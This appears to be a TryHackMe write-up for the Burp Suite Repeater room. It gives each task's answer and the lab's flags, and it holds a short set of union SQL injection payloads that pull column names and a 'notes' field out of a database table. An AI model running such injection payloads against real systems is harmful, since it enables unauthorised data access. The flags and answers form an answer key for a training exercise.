# Burp Suite - Repeater 

December 2, 2023

#### Task 1: Introduction

- Let's get started
	- `No answer needed`

#### Task 2: What is Repeater?

- Which sections gives us a more intuitive control over our requests?
	- `Inspector`

#### Task 3: Basic Usage

- Which view will populate when sending a request from the Proxy module to Repeater?
	- `Request`

#### Task 4: Message Analysis Toolbar

- Which option allows us to visualize the page as it would appear in a web browser?
	- `Render`

#### Task 5: Inspector 

- Which section in Inspector is specific to POST requests?
	- `Body Parameters`

#### Task 6: Practical Example

- What is the flag you receive?
	- `THM{Yzg2MWI2ZDhlYzdlNGFiZTUzZTIzMzVi}`
![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/a2835f14-4820-48b4-a647-37ffd9560795)
![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/1d8d9887-8a63-409d-99ac-9e6e2a573800)


#### Task 7: Challenge

- Enable intercept again and capture a request to one of the numeric products endpoints in the Proxy module, then forward it to Repeater.
	- `No answer needed`

- See if you can get the server to error out with a "500 Internal Server Error" code by changing the number at the end of the request to extreme inputs.
- What is the flag you receive when you cause a 500 error in the endpoint?
	- `THM{N2MzMzFhMTA1MmZiYjA2YWQ4M2ZmMzhl}`
![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/e27caac7-e1fa-46f9-aa5b-2803127121e4)
![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/4fe6e7e9-9db3-4357-ae93-755e8d042b32)
![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/fc59c444-d1a8-40a9-aafc-fcaa0ed5cb06)


#### Task 8: Extra-mile Challenge

- Exploit the union SQL injection vulnerability in the site. What is the flag?
	- `THM{ZGE3OTUyZGMyMzkwNjJmZjg3Mzk1NjJh}`
![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/467c7851-5f28-42a2-8014-c36df2c282c9)
![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/2eb8a0dd-cc88-43e3-ad87-9d1ec1a1b618)

```
GET /about/2' HTTP/1.1
/about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people"
/about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people"
0 UNION ALL SELECT notes,null,null,null,null FROM people WHERE id = 1
```
#### Task 9: Conclusion

- I can use Burp Suite Repeater!
	- `No answer needed`

